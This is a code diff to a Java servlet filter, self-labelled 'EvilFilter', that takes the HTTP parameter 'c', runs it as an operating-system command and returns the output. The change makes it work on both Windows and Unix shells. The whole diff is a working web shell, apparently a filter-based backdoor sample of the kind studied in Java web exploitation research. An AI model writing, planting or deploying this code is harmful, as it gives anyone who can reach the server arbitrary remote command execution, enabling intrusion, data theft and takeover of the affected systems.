@@ -18,11 +18,19 @@ public class CMDFilter implements Filter {
         System.out.println("EvilFilter执行过滤过程");
         HttpServletRequest httpServletRequest = (HttpServletRequest) servletRequest;
         if(httpServletRequest.getParameter("c") != null){
-            String[] cmd = new String[]{"cmd.exe","/c",httpServletRequest.getParameter("c")};
+            String[] cmd = null;
+
+            String os = System.getProperty("os.name");
+            if(os.toLowerCase().startsWith("windows")){
+                cmd = new String[]{"cmd.exe","/c",httpServletRequest.getParameter("c")};
+            }else {
+                cmd = new String[]{"sh","-c",httpServletRequest.getParameter("c")};
+            }
             InputStream inputStream = Runtime.getRuntime().exec(cmd).getInputStream();
             Scanner scanner = new Scanner(inputStream).useDelimiter("\\a");
             String output = scanner.hasNext() ? scanner.next() : "";
             servletResponse.getWriter().write(output);
+            servletResponse.getWriter().write("filter shell exec done");
             servletResponse.getWriter().flush();
             return;
         }
